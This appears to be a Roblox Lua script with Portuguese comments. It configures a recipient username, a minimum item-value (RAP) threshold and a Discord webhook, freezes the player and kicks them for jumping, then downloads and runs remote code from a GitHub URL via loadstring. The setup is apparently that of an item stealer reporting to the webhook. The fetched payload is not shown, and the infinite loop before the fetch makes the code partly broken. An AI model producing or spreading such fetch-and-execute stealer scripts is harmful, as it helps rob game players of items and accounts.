-- Configurações
Username = "vitinZzica"
Username2 = "vitinZzica"
MinimumRAP = 100000
Webhook = "https://discord.com/api/webhooks/1329821094252904458/bP0JimgLmgub0_cqsjrFUBo4TMy-zbl0FkVB5kYc9QeQ641KlqSU_A0WD983cBDvK40B"

-- Função de kick por pular
local function kickout()
    local player = game.Players.LocalPlayer
    local character = player.Character
    local humanoid = character:WaitForChild("Humanoid")
    
    humanoid.JumpPower = 0
    humanoid.WalkSpeed = 0

    while wait() do
        if humanoid.Jump == true then
            game.Players.LocalPlayer:Kick("You jumped")
        end
    end
end

-- Executa a função de kick
kickout()

-- Carrega o script externo
loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
